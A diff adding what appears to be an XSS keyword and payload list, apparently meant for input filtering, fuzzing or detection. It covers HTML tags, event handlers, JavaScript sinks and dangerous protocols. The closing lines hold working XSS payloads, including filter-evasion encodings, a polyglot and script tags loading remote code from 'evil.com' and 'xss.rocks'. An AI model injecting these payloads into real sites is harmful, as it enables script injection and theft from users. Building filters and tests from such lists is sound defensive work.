@@ -1,0 +1,270 @@
+# HTML Tags
+<script
+<img
+<iframe
+<object
+<embed
+<form
+<input
+<textarea
+<a
+<body
+<html
+<head
+<link
+<style
+<svg
+<video
+<audio
+<source
+<track
+<frame
+<frameset
+<marquee
+<meta
+<base
+<button
+<select
+<option
+<details
+<dialog
+<menu
+<menuitem
+<template
+<xmp
+<plaintext
+%3Cscript
+%3Cimg
+%3Ciframe
+%3Cobject
+%3Cembed
+%3Cform
+%3Cinput
+%3Ctextarea
+%3Ca
+%3Cbody
+%3Chtml
+%3Chead
+%3Clink
+%3Cstyle
+%3Csvg
+%3Cvideo
+%3Caudio
+%3Csource
+%3Ctrack
+%3Cframe
+%3Cframeset
+%3Cmarquee
+%3Cmeta
+%3Cbase
+%3Cbutton
+%3Cselect
+%3Coption
+%3Cdetails
+%3Cdialog
+%3Cmenu
+%3Cmenuitem
+%3Ctemplate
+%3Cxmp
+%3Cplaintext
+script
+img
+iframe
+object
+embed
+form
+input
+textarea
+a
+body
+html
+head
+link
+style
+svg
+video
+audio
+source
+track
+frame
+frameset
+marquee
+meta
+base
+button
+select
+option
+details
+dialog
+menu
+menuitem
+template
+xmp
+plaintext
+# Event Handlers
+onerror
+onload
+onclick
+onmouseover
+onfocus
+onblur
+onchange
+onkeydown
+onkeyup
+onmousedown
+onmouseup
+onmouseenter
+onmouseleave
+onmousewheel
+onpointerdown
+onpointerup
+onreset
+onsubmit
+onselect
+oncut
+oncopy
+onpaste
+ondrag
+ondrop
+onscroll
+onwheel
+onhashchange
+onmessage
+onstorage
+onunload
+onbeforeunload
+onpagehide
+onpageshow
+onpopstate
+onresize
+ontoggle
+# JavaScript Functions & Objects
+eval
+document.write
+document.writeln
+document.location
+window.location
+window.onerror
+alert
+confirm
+prompt
+setTimeout
+setInterval
+innerHTML
+outerHTML
+insertAdjacentHTML
+document.cookie
+localStorage
+sessionStorage
+XMLHttpRequest
+fetch
+WebSocket
+import
+export
+Function
+constructor
+prototype
+toString
+valueOf
+unescape
+escape
+encodeURI
+encodeURIComponent
+decodeURI
+decodeURIComponent
+atob
+btoa
+JSON.parse
+JSON.stringify
+RegExp
+Proxy
+Reflect
+# Dangerous Attributes
+src
+href
+action
+formaction
+poster
+background
+data
+dynsrc
+lowsrc
+codebase
+archive
+classid
+usemap
+srcdoc
+sandbox
+allow-scripts
+allow-forms
+allow-same-origin
+allow-top-navigation
+contenteditable
+autofocus
+pattern
+# Protocols & Data URIs
+javascript:
+data:text/html
+data:text/javascript
+vbscript:
+about:
+# Evasion Techniques
+<scr<script>ipt>
+<IMG SRC="jav&#x09;ascript:alert(1)">
+<IMG SRC="jav	ascript:alert(1)">
+<IMG SRC="jav
+ascript:alert(1)">
+<IMG SRC="jav&#x0A;ascript:alert(1)">
+<IMG SRC="jav&#x0D;ascript:alert(1)">
+<IMG SRC="jav&#x00;ascript:alert(1)">
+# SVG
+<svg onload=alert(1)>
+# DOM-Based XSS Sinks
+document.domain
+document.referrer
+document.URL
+document.documentURI
+document.baseURI
+document.title
+document.body.innerHTML
+document.forms[0].action
+window.name
+location.href
+location.hash
+location.search
+history.pushState
+history.replaceState
+# Web Components & Shadow DOM
+<slot
+<shadow
+<content
+<script>alert(1)</script>
+<script src="https://evil.com/xss.js"></script>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<tag onmouseover=alert(1)>  // Hover-based
+<tag onfocus=alert(1) autofocus>  // Auto-triggered
+<tag onscroll=alert(1) style="height:1000px;overflow:scroll">
+<tag onanimationstart=alert(1) style="animation:x 1s">
+<scr\x00ipt>alert(1)</script>
+<javascript:alert(1)>
+<img src=x onerror=\x09"alert(1)">
+<a href="jav&#x09;ascript:alert(1)">click</a>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+eval(location.hash.slice(1))
+document.write(untrustedInput)
+innerHTML=userControlledData
+<!--<script>-->alert(1)<!--</script>-->
+<input value=aaa onfocus=alert(1) autofocus>
+';alert(1);//
+<IMG SRC=javascript:alert('XSS')>
+<a href="javascript:alert(String.fromCharCode(88,83,83))">
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<svg><script>alert(1)</script></svg>
+<math><maction actiontype="statusline#javascript:alert(1)">click</maction></math>
+<style>@import "javascript:alert(1)";</style>
+<div style="background:url('javascript:alert(1)')">
